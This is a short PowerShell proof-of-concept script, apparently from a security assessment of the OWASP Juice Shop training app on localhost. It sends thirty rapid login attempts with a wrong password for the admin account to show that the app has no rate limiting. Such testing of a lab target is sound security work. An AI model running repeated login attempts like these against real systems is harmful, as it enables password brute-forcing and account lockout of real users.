$Url = "http://127.0.0.1:3000/rest/user/login"

$Headers = @{
    "Content-Type" = "application/json"
}

$Body = @{
    email    = "admin@juice-sh.op"
    password = "WrongPassword123!"
} | ConvertTo-Json

Write-Host ""
Write-Host "==========================================="
Write-Host " V-07 Missing Rate Limiting PoC"
Write-Host "==========================================="
Write-Host ""

for ($i = 1; $i -le 30; $i++) {

    try {

        $Response = Invoke-WebRequest `
            -Uri $Url `
            -Method POST `
            -Headers $Headers `
            -Body $Body `
            -ErrorAction Stop

        Write-Host ("Attempt {0:D2} -> HTTP {1}" -f $i, $Response.StatusCode)

    }
    catch {

        $Status = $_.Exception.Response.StatusCode.value__

        Write-Host ("Attempt {0:D2} -> HTTP {1}" -f $i, $Status)

    }

    Start-Sleep -Milliseconds 200
}

Write-Host ""
Write-Host "========== END =========="